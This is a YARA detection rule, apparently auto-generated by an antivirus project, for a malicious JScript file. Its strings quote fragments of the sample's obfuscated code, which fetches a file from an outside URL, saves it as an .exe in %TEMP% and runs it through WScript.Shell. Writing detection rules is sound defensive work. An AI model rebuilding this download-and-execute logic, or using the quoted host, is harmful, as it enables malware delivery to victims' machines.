rule sig_20160329_fd423edac340c6efab91be36999b7440 {
  meta:
    description = "datamaliciousorder - file 20160329_fd423edac340c6efab91be36999b7440.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e5f3bd9e17a0a75b310f5dfb4da6b22919c09ee87f41537fa19392275b55a87f"

  strings:
    $s1  = "function Tpzsf() {return Kypobm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"tNDSFp8oqS.exe\";};" fullword ascii
    $s2  = "Xxznqylz[Ajwlo](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Kigrc](Vdnuvwb() * 11)} while (Xxznqylz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Tasyhh(Oauip, Exqnuox){return Oauip - Exqnuox;};" fullword ascii
    $s5  = "var Kypobm = function Kbtazuey() {return WScript[Pkplxcjld](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kpvpwc() {return ((Hlzval == true) && (Hlzval == Icliboli)) ? 1 : Qubrhphi;};" fullword ascii
    $s7  = "function Prsikmh(Nlwaayl){Kypobm[\"Run\"](Nlwaayl, Qubrhphi, Qubrhphi);};" fullword ascii
    $s8  = "Icliboli = true; " fullword ascii
    $s9  = "var Icliboli = false;" fullword ascii
    $s10 = "function Dvowtn(){return Pkplxcjld;};" fullword ascii
    $s11 = "return Tasyhh(Nvzbrzvb, Echdyd);" fullword ascii
    $s12 = "Hlzval = true; " fullword ascii
    $s13 = "function Xbtcoauvg(){return Epgtbblhwa;};" fullword ascii
    $s14 = "var Hlzval = false;" fullword ascii
    $s15 = "function Vdnuvwb(){return 22;};" fullword ascii
    $s16 = " while (Kycwut){" fullword ascii
    $s17 = "var Wazmkippy = new this[\"Date\"]();" fullword ascii
    $s18 = "function Vhgtc(Rmafvlvrg) {var Tlyrjqkzr = (1, 2, 3, 4, 5, Rmafvlvrg); return Tlyrjqkzr;};" fullword ascii
    $s19 = "var Vcqkcp = false;" fullword ascii
    $s20 = "function Xiduucmq()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}